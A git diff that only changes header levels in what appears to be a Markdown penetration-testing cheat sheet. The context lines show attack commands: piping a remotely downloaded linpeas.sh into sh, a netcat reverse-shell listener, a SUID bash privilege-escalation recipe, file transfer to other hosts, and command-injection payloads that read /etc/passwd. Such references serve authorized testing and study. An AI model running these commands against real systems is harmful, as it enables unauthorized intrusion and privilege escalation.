@@ -14,17 +14,17 @@
 - [SCP](#scp)
 - [Sudo](#sudo)
 
-## Sudo
+# Sudo
 ```bash
 sudo -l
 ```
 
-## Auto Script
+# Auto Script
 ```bash
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ```
 
-## Reverse Shell
+# Reverse Shell
 ### Server
 ```bash
 nc -lp 4444
@@ -74,13 +74,13 @@ script -qc /bin/bash /dev/null
 
 *[source](https://github.com/acole76/pentestmonkey-cheatsheets/blob/master/shells.md)*
 
-## Privilege Escalation
+# Privilege Escalation
 ```
 /bin/cp /bin/bash /tmp/bash_up; /bin/chown user:group /tmp/bash_up; chmod g+s /tmp/bash_up; chmod u+s /tmp/bash_up
 /tmp/bash_up -p
 ```
 
-## SCP
+# SCP
 ### Download File
 ```
 scp -P port user@192.168.1.ip:path .
@@ -95,13 +95,13 @@ scp -P port file user@192.168.1.ip:path
 ```
 scp -P 22 -r ~/.peda user@192.168.1.ip:/tmp/peda
 ```
-## FTP
+# FTP
 ### Download all files
 ```
 wget -m --user=user--password=fpassword ftp://10.10.11.160
 ```
 
-## Gdbserver
+# Gdbserver
 *Port: 1337*
 ```
 $ gdb
@@ -110,7 +110,7 @@ $ gdb
 (gdb) remote put local_file remote_file
 ```
 
-## File Enumeration
+# File Enumeration
 ### Classic
 - `/etc/passwd`  &  `/etc/shadow`
 - `/www/html` ꞏ `/var/www` ꞏ `/srv/html` ꞏ `/usr/share/*`
@@ -152,7 +152,7 @@ chmod +x lse.sh
 curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -O
 ```
 
-## Command Injection
+# Command Injection
 ```bash
 ;{cat,/etc/passwd}
 ;cat${IFS}/etc/passwd;
@@ -168,7 +168,7 @@ $(cat /etc/passwd)
 [GTFOBins - Bypass  local security restrictions](https://gtfobins.github.io/)
 
 
-## Port Forwarding
+# Port Forwarding
 
 ### Chisel
 
